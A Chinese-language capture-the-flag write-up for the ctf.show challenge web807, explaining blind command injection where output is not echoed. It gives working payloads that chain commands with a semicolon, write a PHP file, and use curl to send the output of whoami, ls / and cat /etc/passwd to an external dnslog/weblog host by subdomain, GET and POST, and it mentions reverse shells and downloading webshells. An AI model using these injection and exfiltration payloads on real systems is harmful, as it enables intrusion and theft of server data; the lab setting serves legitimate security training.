题目存在RCE命令执行，使用了`exec`、`shell_exec`，反引号等执行命令，但是页面不会显示执行结果，这种情况称为无回显RCE。

解决方法：

- 尝试写文件，如木马webshell
- 尝试curl命令发起http请求，dnslog外带出结果
- 反弹shell
- 如果有wget命令，可以在远程服务器上写一个webshell，wget下载到靶机上
- 不出网且不能写文件时，可以考虑时间盲注

推荐写文件、dnslog、weblog外带，简单便捷零成本，即开即用。

举例，以题目[web807](https://ctf.show/challenges#web807-1847)举例：

题目这里shell_exec会对于用户传入的url进行访问，没有任何过滤，可以在shell_exec函数里使用分号执行多个命令

![1](./images/rce_no_res/1.png)

## 写文件

使用echo命令搭配重定向符，把输出内容写入文件中

```bash
echo "<?php phpinfo(); ?>" > 1.php
```

payload：`url=https://127.0.0.1/;echo "<?php phpinfo(); ?>" > 1.php`

访问1.php，发现没有这个文件，这道题可能没有写的权限。

## 使用curl发起http请求(dnslog/weblog)

推荐一个[dnslog](https://eyes.sh/dns/)平台，免费好用无需注册

使用反引号获取命令执行结果作为子域名，带出命令执行结果

```bash
curl "https://`whoami`.example.com"
```

在[dnslog](https://eyes.sh/dns/)获取一个平台分配的子域名，替换上面的域名

![2](./images/rce_no_res/2.png)

dnslog payload：url=https://`whoami`.enwvbm6o.eyes.sh

提交payload可以看到子域名命令包含命令执行结果`www-data`

![3](./images/rce_no_res/3.png)


dnslog有什么缺陷？

尝试把`whoami`替换成其他命令，如`ls /`,`cat /etc/passwd`

可以发现，dnslog子域名在遇到空格时，就断了，拿到的结果太短

![4](./images/rce_no_res/4.png)

引出weblog的使用，weblog会记录完整的get请求，post请求，但是get请求下，命令执行结果函数有空格或换行时，还是会截断，因此更推荐使用post请求，拿到完整的命令执行结果。

把命令执行结果作为get请求的参数带出，get请求的payload：url=https://127.0.0.1;curl http://enwvbm6o.eyes.sh/?1=`ls /`

注意这个weblog平台要用http。发现get请求还是会被空格、换行截断

![5](./images/rce_no_res/5.png)

尝试使用curl发起post请求
```bash
curl -X POST -d "1=`ls /`" http://enwvbm6o.eyes.sh/
```

payload：url=https://127.0.0.1;curl -X POST -d "1=`ls /`" http://enwvbm6o.eyes.sh/


可以看到拿到了完整的命令执行结果

![6](./images/rce_no_res/6.png)

payload：url=https://127.0.0.1;curl -X POST -d "1=`cat /etc/passwd`" http://enwvbm6o.eyes.sh/

![7](./images/rce_no_res/7.png)